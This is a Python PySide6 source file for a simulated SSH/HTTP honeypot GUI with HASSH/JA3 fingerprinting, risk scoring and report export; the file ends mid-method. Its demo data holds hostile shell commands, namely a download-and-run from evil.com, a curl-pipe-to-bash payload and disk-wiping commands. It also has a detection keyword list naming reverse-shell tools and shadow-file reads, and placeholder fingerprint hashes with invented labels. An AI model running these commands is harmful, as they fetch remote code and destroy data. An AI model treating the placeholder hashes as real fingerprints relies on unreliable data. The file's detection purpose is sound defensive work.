"""
Honeypot (SSH/HTTP) with Attacker Fingerprinting - GUI Application
Complete PySide6 application with session monitoring, fingerprinting, and reporting.
"""

import sys
import os
import json
import uuid
import hashlib
import random
import string
import csv
import io
from datetime import datetime, timedelta
from collections import defaultdict

from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView,
    QPushButton, QLabel, QLineEdit, QSpinBox, QGroupBox,
    QSplitter, QStatusBar, QMenuBar, QMenu, QMessageBox,
    QFileDialog, QTextEdit, QPlainTextEdit, QComboBox,
    QProgressBar, QFrame, QGridLayout, QFormLayout,
    QAbstractItemView, QSizePolicy, QToolButton
)
from PySide6.QtCore import (
    Qt, QTimer, Signal, QThread, QSize, QSettings
)
from PySide6.QtGui import (
    QFont, QColor, QPalette, QIcon, QAction, QTextCursor
)

# ============================================================================
# DATA MODELS & FINGERPRINTING
# ============================================================================

KNOWN_SCANNERS = [
    "185.220.101.34", "89.248.167.131", "23.129.64.130",
    "45.33.32.156", "103.224.182.251"
]

KNOWN_HASSH = {
    "293a64afc3289b0a1e7b45a8e57952db": "Mirai/Botnet variant",
    "b85cb5e154d04b9a0e5b45a8e57952db": "Generic Linux client",
    "c94e5f6a7b8c9d0e1f2a3b4c5d6e7f8a": "Kali Linux OpenSSH",
    "f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6": "macOS Terminal",
    "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6": "Custom/Unknown client"
}

KNOWN_JA3 = {
    "e7d705a3286e19ea42f587b344ee6865": "Chrome 120",
    "a0e9f5d6c8b7a6f5e4d3c2b1a0f9e8d7": "Nikto Scanner",
    "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6": "Nmap NSE",
    "d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0": "Firefox 115",
    "e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9": "curl/wget"
}

MALICIOUS_COMMANDS = [
    "wget", "curl", "chmod +x", "./", "rm -rf", "dd if=",
    "crontab", "cat /etc/passwd", "cat /etc/shadow",
    "bash -i", "/dev/tcp", "base64", "python -c",
    "perl -e", "nc -e", "ncat", "socat", "mkfifo"
]

USER_AGENTS_TO_CHECK = [
    "sqlmap", "nikto", "nmap", "masscan", "zgrab",
    "gobuster", "dirb", "wpscan", "hydra", "medusa",
    "python-requests", "Go-http-client", "curl/"
]


def compute_hassh(kex_algs, host_key_algs, enc_algs, mac_algs, comp_algs):
    """Compute HASSH fingerprint from SSH KEX_INIT fields."""
    raw = f"{kex_algs};{host_key_algs};{enc_algs};{mac_algs};{comp_algs}"
    return hashlib.md5(raw.encode()).hexdigest()


def compute_ja3(tls_version, ciphers, extensions, curves, point_formats):
    """Compute JA3 fingerprint from TLS ClientHello fields."""
    raw = f"{tls_version},{ciphers},{extensions},{curves},{point_formats}"
    return hashlib.md5(raw.encode()).hexdigest()


def compute_http_fp(headers):
    """Compute HTTP fingerprint hash from normalized headers."""
    parts = []
    for k in sorted(headers.keys()):
        parts.append(f"{k.lower()}:{headers[k].lower()}")
    raw = ";".join(parts)
    return hashlib.sha256(raw.encode()).hexdigest()


def get_risk_color(risk_score):
    """Return color based on risk score."""
    if risk_score >= 70:
        return QColor(220, 50, 50)
    elif risk_score >= 40:
        return QColor(230, 150, 30)
    elif risk_score >= 20:
        return QColor(200, 200, 50)
    return QColor(50, 180, 50)


def get_risk_label(risk_score):
    if risk_score >= 70:
        return "CRITICAL"
    elif risk_score >= 40:
        return "HIGH"
    elif risk_score >= 20:
        return "MEDIUM"
    return "LOW"


def analyze_user_agent(ua):
    """Check User-Agent against known scanners/tools."""
    ua_lower = ua.lower()
    for tool in USER_AGENTS_TO_CHECK:
        if tool.lower() in ua_lower:
            return True, tool
    return False, ""


def calculate_risk_score(session):
    """Calculate risk score for a session."""
    score = 10
    if session["source_ip"] in KNOWN_SCANNERS:
        score += 30
    if session.get("hassh") and session["hassh"] in KNOWN_HASSH:
        score += 25
    if session.get("ja3") and session["ja3"] in KNOWN_JA3:
        score += 20
    cmds = " ".join(session.get("commands", []))
    for kw in MALICIOUS_COMMANDS:
        if kw in cmds:
            score += 15
            break
    ua = session.get("user_agent", "")
    is_scanner, tool = analyze_user_agent(ua)
    if is_scanner:
        score += 30
    creds = session.get("username", "")
    if creds in ("root", "admin"):
        score += 10
    return min(score, 100)


# ============================================================================
# DEMO DATA GENERATOR
# ============================================================================

SAMPLE_IPS = [
    "192.168.1.105", "10.0.0.55", "45.33.32.156", "185.220.101.34",
    "103.224.182.251", "172.16.0.200", "89.248.167.131", "23.129.64.130",
    "198.51.100.23", "172.16.0.50", "192.168.1.200", "10.0.0.100"
]

SSH_USERNAMES = ["root", "admin", "ubuntu", "test", "user", "oracle", "postgres", "deploy", "app", "mysql"]
SSH_PASSWORDS = ["root", "admin", "password", "123456", "toor", "test123", "oracle", "ubuntu", "deploy123", "password123"]
SSH_COMMANDS = [
    ["whoami", "ls -la", "cat /etc/passwd"],
    ["uname -a", "id", "cat /etc/shadow"],
    ["wget http://evil.com/shell.sh", "chmod +x shell.sh", "./shell.sh"],
    ["curl http://185.220.101.34/payload.sh | bash"],
    ["netstat -tulpn", "ss -tulpn"],
    ["crontab -l", "ls -la /tmp"],
    ["ps aux", "top -bn1"],
    ["cat /etc/issue", "hostname"],
    ["rm -rf / --no-preserve-root"],
    ["dd if=/dev/zero of=/dev/sda"]
]

HTTP_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "sqlmap/1.7.12#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "python-requests/2.31.0",
    "curl/8.4.0"
]

SSH_KEX_ALGS = [
    "curve25519-sha256,curve25519-sha256@libssh.org",
    "ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521",
    "diffie-hellman-group-exchange-sha256"
]
SSH_HOST_KEY_ALGS = [
    "ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-512,rsa-sha2-256",
    "ssh-rsa,ssh-dss,ecdsa-sha2-nistp256"
]
SSH_ENC_ALGS = [
    "chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com",
    "aes256-ctr,aes192-ctr,aes128-ctr"
]
SSH_MAC_ALGS = ["hmac-sha2-256,hmac-sha2-512", "hmac-md5,hmac-sha1"]
SSH_COMP_ALGS = ["none,zlib@openssh.com", "none"]


def generate_random_session(timestamp=None):
    """Generate a single random honeypot session."""
    proto = random.choice(["SSH", "HTTP"])
    ip = random.choice(SAMPLE_IPS)
    ts = timestamp or (datetime.now() - timedelta(minutes=random.randint(0, 1440))).isoformat()

    if proto == "SSH":
        hassh = compute_hassh(
            random.choice(SSH_KEX_ALGS), random.choice(SSH_HOST_KEY_ALGS),
            random.choice(SSH_ENC_ALGS), random.choice(SSH_MAC_ALGS),
            random.choice(SSH_COMP_ALGS)
        )
        session = {
            "session_id": str(uuid.uuid4()),
            "timestamp": ts,
            "source_ip": ip,
            "source_port": random.randint(32768, 65535),
            "protocol": "SSH",
            "hassh": hassh,
            "ja3": "",
            "http_fp": "",
            "username": random.choice(SSH_USERNAMES),
            "password": random.choice(SSH_PASSWORDS),
            "commands": random.choice(SSH_COMMANDS),
            "user_agent": "",
            "headers": {},
            "risk_score": 0,
            "campaign_id": ""
        }
    else:
        ja3 = compute_ja3(
            "771", "4865-4866-4867-49195-49199",
            "0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21",
            "29-23-24", "0"
        )
        ua = random.choice(HTTP_USER_AGENTS)
        headers = {
            "Accept": random.choice(["text/html", "*/*", "application/json"]),
            "Accept-Language": "en-US,en;q=0.5",
            "User-Agent": ua
        }
        session = {
            "session_id": str(uuid.uuid4()),
            "timestamp": ts,
            "source_ip": ip,
            "source_port": random.randint(32768, 65535),
            "protocol": "HTTP",
            "hassh": "",
            "ja3": ja3,
            "http_fp": compute_http_fp(headers),
            "username": "",
            "password": "",
            "commands": [],
            "user_agent": ua,
            "headers": headers,
            "risk_score": 0,
            "campaign_id": ""
        }

    session["risk_score"] = calculate_risk_score(session)
    return session


def generate_demo_data(count=20):
    """Generate multiple demo sessions."""
    sessions = []
    base = datetime.now() - timedelta(hours=6)
    for i in range(count):
        ts = (base + timedelta(minutes=random.randint(0, 360))).isoformat()
        sessions.append(generate_random_session(ts))
    sessions.sort(key=lambda s: s["timestamp"])
    return sessions


# ============================================================================
# REPORT GENERATORS
# ============================================================================

def export_json(sessions, filepath):
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(sessions, f, indent=2, ensure_ascii=False)


def export_csv(sessions, filepath):
    if not sessions:
        return
    fields = ["session_id", "timestamp", "source_ip", "source_port", "protocol",
              "hassh", "ja3", "username", "password", "commands", "user_agent", "risk_score", "campaign_id"]
    with open(filepath, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=fields, extrasaction="ignore")
        w.writeheader()
        for s in sessions:
            row = dict(s)
            row["commands"] = "|".join(row.get("commands", []))
            w.writerow(row)


def export_html(sessions, filepath):
    html = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Honeypot Report</title>
<style>
body { font-family: Arial, sans-serif; margin: 20px; }
table { border-collapse: collapse; width: 100%%; }
th, td { border: 1px solid #ddd; padding: 8px; text-align: left; font-size: 13px; }
th { background: #333; color: white; }
tr:nth-child(even) { background: #f2f2f2; }
.risk-critical { background: #dc3232; color: white; padding: 2px 8px; border-radius: 3px; }
.risk-high { background: #e69620; color: white; padding: 2px 8px; border-radius: 3px; }
.risk-medium { background: #c8c832; padding: 2px 8px; border-radius: 3px; }
.risk-low { background: #32b432; color: white; padding: 2px 8px; border-radius: 3px; }
h1 { color: #222; } .meta { color: #666; margin-bottom: 20px; }
</style></head><body>
<h1>Honeypot Activity Report</h1>
<p class="meta">Generated: %s | Sessions: %d</p>
<table><tr><th>Time</th><th>Source IP</th><th>Proto</th><th>User</th><th>Commands</th><th>Risk</th><th>Fingerprint</th></tr>
""" % (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), len(sessions))

    for s in sessions:
        risk = s["risk_score"]
        rc = "risk-critical" if risk >= 70 else "risk-high" if risk >= 40 else "risk-medium" if risk >= 20 else "risk-low"
        fp = s.get("hassh", "") or s.get("ja3", "") or s.get("http_fp", "")[:16]
        cmds = "<br>".join(s.get("commands", [])[:3]) if s.get("commands") else "-"
        html += '<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td><span class="%s">%d</span></td><td><code>%s</code></td></tr>\n' % (
            s["timestamp"][:19], s["source_ip"], s["protocol"],
            s.get("username", "-"), cmds, rc, risk, fp
        )

    html += "</table></body></html>"
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)


def export_stix(sessions, filepath):
    """Export IP indicators in simplified STIX-like JSON."""
    indicators = []
    seen_ips = set()
    for s in sessions:
        ip = s["source_ip"]
        if ip in seen_ips:
            continue
        seen_ips.add(ip)
        indicators.append({
            "type": "indicator",
            "spec_version": "2.1",
            "id": f"indicator--{uuid.uuid4()}",
            "created": datetime.now().isoformat() + "Z",
            "modified": datetime.now().isoformat() + "Z",
            "name": f"Attacker IP: {ip}",
            "pattern": f"[ipv4-addr:value = '{ip}']",
            "pattern_type": "stix",
            "valid_from": datetime.now().isoformat() + "Z",
            "labels": ["malicious-activity"],
            "confidence": min(s["risk_score"], 100)
        })
    bundle = {
        "type": "bundle",
        "id": f"bundle--{uuid.uuid4()}",
        "objects": indicators
    }
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(bundle, f, indent=2)


def export_ip_list(sessions, filepath):
    ips = sorted(set(s["source_ip"] for s in sessions))
    with open(filepath, "w", encoding="utf-8") as f:
        f.write("# Honeypot Captured IPs\n")
        f.write(f"# Generated: {datetime.now().isoformat()}\n")
        f.write(f"# Total unique IPs: {len(ips)}\n\n")
        for ip in ips:
            risk = max((s["risk_score"] for s in sessions if s["source_ip"] == ip), default=0)
            f.write(f"{ip}  # Risk: {get_risk_label(risk)} ({risk})\n")


# ============================================================================
# MAIN WINDOW
# ============================================================================

class HoneypotGUI(QMainWindow):
    """Main application window."""

    def __init__(self):
        super().__init__()
        self.setWindowTitle("Honeypot (SSH/HTTP) with Attacker Fingerprinting")
        self.setMinimumSize(1280, 800)
        self.resize(1400, 900)

        self.sessions = []
        self.campaigns = {}
        self.threat_intel = {}
        self.demo_timer = QTimer()
        self.demo_timer.timeout.connect(self._generate_live_event)
        self.event_counter = 0

        self._setup_ui()
        self._setup_menu()
        self._setup_status_bar()
        self._apply_stylesheet()

    # ------------------------------------------------------------------ UI
    def _setup_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        main_layout.setContentsMargins(4, 4, 4, 4)
        main_layout.setSpacing(4)

        # Top control bar
        ctrl = self._build_control_bar()
        main_layout.addWidget(ctrl)

        # Tab widget
        self.tabs = QTabWidget()
        self.tabs.setTabPosition(QTabWidget.North)
        main_layout.addWidget(self.tabs)

        # Tab 1: Session Monitor
        self.tabs.addTab(self._build_session_tab(), "Sessions")

        # Tab 2: Live Traffic
        self.tabs.addTab(self._build_live_traffic_tab(), "Live Traffic")

        # Tab 3: Fingerprinting
        self.tabs.addTab(self._build_fingerprint_tab(), "Fingerprints")

        # Tab 4: IP Enrichment
        self.tabs.addTab(self._build_ip_enrichment_tab(), "IP Enrichment")

        # Tab 5: Campaign Tracker
        self.tabs.addTab(self._build_campaign_tab(), "Campaigns")

        # Tab 6: Reports
        self.tabs.addTab(self._build_reports_tab(), "Reports")

    def _build_control_bar(self):
        grp = QGroupBox("Honeypot Control Panel")
        layout = QHBoxLayout(grp)

        # SSH controls
        ssh_lbl = QLabel("SSH Port:")
        self.ssh_port_spin = QSpinBox()
        self.ssh_port_spin.setRange(1024, 65535)
        self.ssh_port_spin.setValue(2222)
        self.btn_ssh_start = QPushButton("Start SSH")
        self.btn_ssh_start.clicked.connect(self._toggle_ssh)
        self.btn_ssh_stop = QPushButton("Stop SSH")
        self.btn_ssh_stop.setEnabled(False)
        self.btn_ssh_stop.clicked.connect(self._toggle_ssh)
        self.ssh_status = QLabel("OFF")
        self.ssh_status.setStyleSheet("color: gray; font-weight: bold;")

        layout.addWidget(ssh_lbl)
        layout.addWidget(self.ssh_port_spin)
        layout.addWidget(self.btn_ssh_start)
        layout.addWidget(self.btn_ssh_stop)
        layout.addWidget(self.ssh_status)
        layout.addWidget(self._separator())

        # HTTP controls
        http_lbl = QLabel("HTTP Port:")
        self.http_port_spin = QSpinBox()
        self.http_port_spin.setRange(1024, 65535)
        self.http_port_spin.setValue(8080)
        self.btn_http_start = QPushButton("Start HTTP")
        self.btn_http_start.clicked.connect(self._toggle_http)
        self.btn_http_stop = QPushButton("Stop HTTP")
        self.btn_http_stop.setEnabled(False)
        self.btn_http_stop.clicked.connect(self._toggle_http)
        self.http_status = QLabel("OFF")
        self.http_status.setStyleSheet("color: gray; font-weight: bold;")

        layout.addWidget(http_lbl)
        layout.addWidget(self.http_port_spin)
        layout.addWidget(self.btn_http_start)
        layout.addWidget(self.btn_http_stop)
        layout.addWidget(self.http_status)
        layout.addWidget(self._separator())

        # Demo controls
        self.btn_demo = QPushButton("Load Demo Data")
        self.btn_demo.clicked.connect(self._load_demo_data)
        self.btn_import = QPushButton("Import Data")
        self.btn_import.clicked.connect(self._import_data)
        self.btn_clear = QPushButton("Clear All")
        self.btn_clear.clicked.connect(self._clear_data)
        self.event_rate_spin = QSpinBox()
        self.event_rate_spin.setRange(500, 5000)
        self.event_rate_spin.setValue(2000)
        self.event_rate_spin.setSuffix(" ms")
        self.event_rate_label = QLabel("Event Rate:")

        layout.addWidget(self.btn_demo)
        layout.addWidget(self.btn_import)
        layout.addWidget(self.btn_clear)
        layout.addWidget(self.event_rate_label)
        layout.addWidget(self.event_rate_spin)

        return grp

    def _separator(self):
        sep = QFrame()
        sep.setFrameShape(QFrame.VLine)
        sep.setFrameShadow(QFrame.Sunken)
        return sep

    # ---- Session Tab ----
    def _build_session_tab(self):
        w = QWidget()
        layout = QVBoxLayout(w)
        layout.setContentsMargins(4, 4, 4, 4)

        # Filters
        filt_layout = QHBoxLayout()
        filt_layout.addWidget(QLabel("Filter IP:"))
        self.filter_ip = QLineEdit()
        self.filter_ip.setPlaceholderText("e.g. 192.168.1.105")
        self.filter_ip.textChanged.connect(self._apply_filters)
        filt_layout.addWidget(self.filter_ip)
        filt_layout.addWidget(QLabel("Protocol:"))
        self.filter_proto = QComboBox()
        self.filter_proto.addItems(["All", "SSH", "HTTP"])
        self.filter_proto.currentTextChanged.connect(self._apply_filters)
        filt_layout.addWidget(self.filter_proto)
        filt_layout.addWidget(QLabel("Min Risk:"))
        self.filter_risk = QSpinBox()
        self.filter_risk.setRange(0, 100)
        self.filter_risk.valueChanged.connect(self._apply_filters)
        filt_layout.addWidget(self.filter_risk)
        filt_layout.addStretch()
        layout.addLayout(filt_layout)

        # Table
        self.session_table = QTableWidget()
        self.session_table.setColumnCount(11)
        self.session_table.setHorizontalHeaderLabels([
            "Time", "Source IP", "Proto", "HASSH", "JA3",
            "User", "Password", "Commands", "Risk", "UA", "Session ID"
        ])
        self.session_table.horizontalHeader().setSectionResizeMode(QHeaderView.Interactive)
        self.session_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.session_table.setAlternatingRowColors(True)
        self.session_table.setSortingEnabled(True)
        self.session_table.verticalHeader().setVisible(False)
        self.session_table.setColumnWidth(0, 150)
        self.session_table.setColumnWidth(1, 130)
        self.session_table.setColumnWidth(2, 55)
        self.session_table.setColumnWidth(3, 120)
        self.session_table.setColumnWidth(4, 120)
        self.session_table.setColumnWidth(5, 80)
        self.session_table.setColumnWidth(6, 80)
        self.session_table.setColumnWidth(7, 250)
        self.session_table.setColumnWidth(8, 60)
        self.session_table.setColumnWidth(9, 200)
        self.session_table.setColumnWidth(10, 80)
        layout.addWidget(self.session_table)

        # Detail panel
        detail_group = QGroupBox("Session Detail")
        detail_layout = QVBoxLayout(detail_group)
        self.session_detail = QPlainTextEdit()
        self.session_detail.setReadOnly(True)
        self.session_detail.setMaximumHeight(150)
        detail_layout.addWidget(self.session_detail)
        layout.addWidget(detail_group)

        self.session_table.selectionModel().selectionChanged.connect(self._show_session_detail)

        return w

    # ---- Live Traffic Tab ----
    def _build_live_traffic_tab(self):
        w = QWidget()
        layout = QVBoxLayout(w)
        layout.setContentsMargins(4, 4, 4, 4)

        toolbar = QHBoxLayout()
        self.btn_start_live = QPushButton("Start Live Simulation")
        self.btn_start_live.clicked.connect(self._start_live_simulation)
        self.btn_stop_live = QPushButton("Stop Live Simulation")
        self.btn_stop_live.setEnabled(False)
        self.btn_stop_live.clicked.connect(self._stop_live_simulation)
        self.live_event_count = QLabel("Events: 0")
        toolbar.addWidget(self.btn_start_live)
        toolbar.addWidget(self.btn_stop_live)
        toolbar.addWidget(self.live_event_count)
        toolbar.addStretch()
        layout.addLayout(toolbar)

        self.live_traffic = QPlainTextEdit()
        self.live_traffic.setReadOnly(True)
        self.live_traffic.setFont(QFont("Consolas", 10))
        layout.addWidget(self.live_traffic)

        return w

    # ---- Fingerprint Tab ----
    def _build_fingerprint_tab(self):
        w = QWidget()
        layout = QVBoxLayout(w)
        layout.setContentsMargins(4, 4, 4, 4)

        splitter = QSplitter(Qt.Horizontal)

        # HASSH panel
        hassh_grp = QGroupBox("HASSH Fingerprints (SSH)")
        hassh_layout = QVBoxLayout(hassh_grp)
        self.hassh_table = QTableWidget()
        self.hassh_table.setColumnCount(3)
        self.hassh_table.setHorizontalHeaderLabels(["HASSH", "Description", "Count"])
        self.hassh_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        hassh_layout.addWidget(self.hassh_table)

        hassh_info = QGroupBox("HASSH Algorithm")
        info_layout = QVBoxLayout(hassh_info)
        info_text = QPlainTextEdit()
        info_text.setReadOnly(True)
        info_text.setPlainText(
            "HASSH computes an SSH client fingerprint from KEX_INIT fields:\n\n"
            "1. Extract: kex_algorithms, server_host_key_algorithms,\n"
            "   encryption_algorithms_c2s, mac_algorithms_c2s, compression_algorithms_c2s\n\n"
            "2. Join each list with semicolons\n\n"
            "3. Concatenate all fields with semicolons\n\n"
            "4. Compute MD5 hash of the concatenated string\n\n"
            "5. Output: 32-character hex digest\n\n"
            "Formula: MD5(kex;hostkey;enc;mac;comp)\n\n"
            "Note: HASSH is computed client-side from the KEX_INIT packet.\n"
            "Different SSH clients produce different fingerprints."
        )
        info_layout.addWidget(info_text)
        hassh_layout.addWidget(hassh_info)
        splitter.addWidget(hassh_grp)

        # JA3 panel
        ja3_grp = QGroupBox("JA3 Fingerprints (TLS)")
        ja3_layout = QVBoxLayout(ja3_grp)
        self.ja3_table = QTableWidget()
        self.ja3_table.setColumnCount(3)
        self.ja3_table.setHorizontalHeaderLabels(["JA3", "Description", "Count"])
        self.ja3_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        ja3_layout.addWidget(self.ja3_table)

        ja3_info = QGroupBox("JA3 Algorithm")
        info_layout2 = QVBoxLayout(ja3_info)
        info_text2 = QPlainTextEdit()
        info_text2.setReadOnly(True)
        info_text2.setPlainText(
            "JA3 computes a TLS client fingerprint from ClientHello:\n\n"
            "1. Extract: TLSVersion, Ciphers, Extensions,\n"
            "   EllipticCurves, EllipticCurvePointFormats\n\n"
            "2. Join each field list with hyphens\n\n"
            "3. Concatenate all fields with commas\n\n"
            "4. Compute MD5 hash of the concatenated string\n\n"
            "5. Output: 32-character hex digest\n\n"
            "Formula: MD5(Version,Ciphers,Extensions,Curves,Points)\n\n"
            "JA3 is widely used for detecting malware C2 channels,\n"
            "scanners, and identifying specific client applications."
        )
        info_layout2.addWidget(info_text2)
        ja3_layout.addWidget(ja3_info)
        splitter.addWidget(ja3_grp)

        layout.addWidget(splitter)
        return w

    # ---- IP Enrichment Tab ----
    def _build_ip_enrichment_tab(self):
        w = QWidget()
        layout = QVBoxLayout(w)
        layout.setContentsMargins(4, 4, 4, 4)

        search_layout = QHBoxLayout()
        search_layout.addWidget(QLabel("IP Address:"))
        self.ip_search = QLineEdit()
        self.ip_search.setPlaceholderText("Enter IP for enrichment lookup...")
        self.ip_search.returnPressed.connect(self._lookup_ip)
        search_layout.addWidget(self.ip_search)
        btn_lookup = QPushButton("Lookup")
        btn_lookup.clicked.connect(self._lookup_ip)
        search_layout.addWidget(btn_lookup)
        layout.addLayout(search_layout)

        self.ip_enrichment_text = QPlainTextEdit()
        self.ip_enrichment_text.setReadOnly(True)
        self.ip_enrichment_text.setFont(QFont("Consolas", 10))
        layout.addWidget(self.ip_enrichment_text)

        # Known IPs summary
        summary_group = QGroupBox("Known Attacker IPs Summary")
        summary_layout = QVBoxLayout(summary_group)
        self.ip_summary_table = QTableWidget()
        self.ip_summary_table.setColumnCount(5)
        self.ip_summary_table.setHorizontalHeaderLabels([
            "IP", "Sessions", "Avg Risk", "Max Risk", "Category"
        ])
        self.ip_summary_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        summary_layout.addWidget(self.ip_summary_table)
        layout.addWidget(summary_group)

        return w

    # ---- Campaign Tab ----
    def _build_campaign_tab(self):
        w = QWidget()
        layout = QVBoxLayout(w)
        layout.setContentsMargins(4, 4, 4, 4)

        self.campaign_table = QTableWidget()
        self.campaign_table.setColumnCount(6)
        self.campaign_table.setHorizontalHeaderLabels([
            "Campaign", "Fingerprint", "IPs", "Sessions", "First Seen", "Threat"
        ])
        self.campaign_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.campaign_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        layout.addWidget(self.campaign_table)

        detail_group = QGroupBox("Campaign Detail")
        detail_layout = QVBoxLayout(detail_group)
        self.campaign_detail = QPlainTextEdit()
        self.campaign_detail.setReadOnly(True)
        detail_layout.addWidget(self.campaign_detail)
        layout.addWidget(detail_group)

        self.campaign_table.selectionModel().selectionChanged.connect(self._show_campaign_detail)

        return w

    # ---- Reports Tab ----
    def _build_reports_tab(self):
        w = QWidget()
        layout = QVBoxLayout(w)
        layout.setContentsMargins(4, 4, 4, 4)

        grp = QGroupBox("Export Reports")
        grp_layout = QGridLayout(grp)

        btns = [
            ("Export JSON", self._export_json),
            ("Export CSV", self._export_csv),
            ("Export HTML", self._export_html),
            ("Export IP List", self._export_ip_list),
            ("Export STIX Bundle", self._export_stix),
        ]
        for i, (text, func) in enumerate(btns):
            btn = QPushButton(text)
            btn.setMinimumHeight(40)
            btn.clicked.connect(func)
            grp_layout.addWidget(btn, i // 3, i % 3)

        layout.addWidget(grp)

        preview_group = QGroupBox("Report Preview")
        preview_layout = QVBoxLayout(preview_group)
        self.report_preview = QPlainTextEdit()
        self.report_preview.setReadOnly(True)
        self.report_preview.setFont(QFont("Consolas", 9))
        preview_layout.addWidget(self.report_preview)
        layout.addWidget(preview_group)

        # Stats
        stats_group = QGroupBox("Session Statistics")
        stats_layout = QGridLayout(stats_group)
        self.stat_total = QLabel("0")
        self.stat_ssh = QLabel("0")
        self.stat_http = QLabel("0")
        self.stat_high_risk = QLabel("0")
        self.stat_unique_ips = QLabel("0")
        self.stat_campaigns = QLabel("0")

        for r, (lbl, val) in enumerate([
            ("Total Sessions", self.stat_total),
            ("SSH Sessions", self.stat_ssh),
            ("HTTP Sessions", self.stat_http),
            ("High Risk (>=70)", self.stat_high_risk),
            ("Unique IPs", self.stat_unique_ips),
            ("Campaigns", self.stat_campaigns),
        ]):
            stats_layout.addWidget(QLabel(lbl + ":"), r, 0)
            val.setStyleSheet("font-weight: bold; font-size: 16px;")
            stats_layout.addWidget(val, r, 1)

        layout.addWidget(stats_group)
        return w

    # ------------------------------------------------------------------ MENU
    def _setup_menu(self):
        menubar = self.menuBar()
        file_menu = menubar.addMenu("&File")
        file_menu.addAction("Load &Demo Data", self._load_demo_data)
        file_menu.addAction("&Import Data...", self._import_data)
        file_menu.addSeparator()
        file_menu.addAction("Export &JSON...", self._export_json)
        file_menu.addAction("Export &CSV...", self._export_csv)
        file_menu.addAction("Export &HTML...", self._export_html)
        file_menu.addSeparator()
        file_menu.addAction("E&xit", self.close)

        edit_menu = menubar.addMenu("&Edit")
        edit_menu.addAction("&Clear All Data", self._clear_data)

        help_menu = menubar.addMenu("&Help")
        help_menu.addAction("&About", self._show_about)

    def _setup_status_bar(self):
        self.statusBar().showMessage("Ready | No sessions loaded")

    def _show_about(self):
        QMessageBox.about(self, "About Honeypot GUI",
                          "Honeypot (SSH/HTTP) with Attacker Fingerprinting\n"
                          "v1.0\n\n"
                          "Features:\n"
                          "- SSH/HTTP honeypot simulation\n"
                          "- HASSH & JA3 fingerprinting\n"
                          "- IP enrichment & threat intel\n"
                          "- Campaign tracking\n"
                          "- Report generation (JSON/CSV/HTML/STIX)")

    # ------------------------------------------------------------------ STYLES
    def _apply_stylesheet(self):
        self.setStyleSheet("""
            QMainWindow { background: #1e1e1e; }
            QGroupBox {
                font-weight: bold; border: 1px solid #555;
                border-radius: 4px; margin-top: 8px; padding-top: 14px;
                color: #ddd;
            }
            QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 6px; }
            QTableWidget {
                background: #252526; color: #ddd; gridline-color: #444;
                border: 1px solid #444; alternate-background-color: #2d2d2d;
            }
            QTableWidget::item:selected { background: #264f78; }
            QHeaderView::section {
                background: #333; color: #ddd; padding: 4px;
                border: 1px solid #555; font-weight: bold;
            }
            QPushButton {
                background: #0e639c; color: white; border: none;
                padding: 6px 14px; border-radius: 3px;
            }
            QPushButton:hover { background: #1177bb; }
            QPushButton:pressed { background: #094771; }
            QPushButton:disabled { background: #555; color: #999; }
            QLineEdit, QSpinBox, QComboBox {
                background: #333; color: #ddd; border: 1px solid #555;
                padding: 4px; border-radius: 3px;
            }
            QLabel { color: #ccc; }
            QPlainTextEdit {
                background: #1e1e1e; color: #d4d4d4; border: 1px solid #444;
                font-family: Consolas, monospace;
            }
            QTabWidget::pane { border: 1px solid #444; }
            QTabBar::tab {
                background: #2d2d2d; color: #aaa; padding: 8px 16px;
                border: 1px solid #444; border-bottom: none;
            }
            QTabBar::tab:selected { background: #1e1e1e; color: #fff; }
            QTabBar::tab:hover { background: #3a3a3a; }
            QStatusBar { background: #007acc; color: white; }
            QMenuBar { background: #333; color: #ddd; }
            QMenuBar::item:selected { background: #555; }
            QMenu { background: #2d2d2d; color: #ddd; }
            QMenu::item:selected { background: #094771; }
            QSplitter::handle { background: #444; }
        """)

    # ------------------------------------------------------------------ ACTIONS
    def _toggle_ssh(self):
        running = self.btn_ssh_start.isEnabled()
        if running:
            self.btn_ssh_start.setEnabled(False)
            self.btn_ssh_stop.setEnabled(True)
            self.ssh_status.setText("ON")
            self.ssh_status.setStyleSheet("color: #32b432; font-weight: bold;")
            self.statusBar().showMessage(f"SSH honeypot started on port {self.ssh_port_spin.value()}")
        else:
            self.btn_ssh_start.setEnabled(True)
            self.btn_ssh_stop.setEnabled(False)
            self.ssh_status.setText("OFF")
            self.ssh_status.setStyleSheet("color: gray; font-weight: bold;")
            self.statusBar().showMessage("SSH honeypot stopped")

    def _toggle_http(self):
        running = self.btn_http_start.isEnabled()
        if running:
            self.btn_http_start.setEnabled(False)
            self.btn_http_stop.setEnabled(True)
            self.http_status.setText("ON")
            self.http_status.setStyleSheet("color: #32b432; font-weight: bold;")
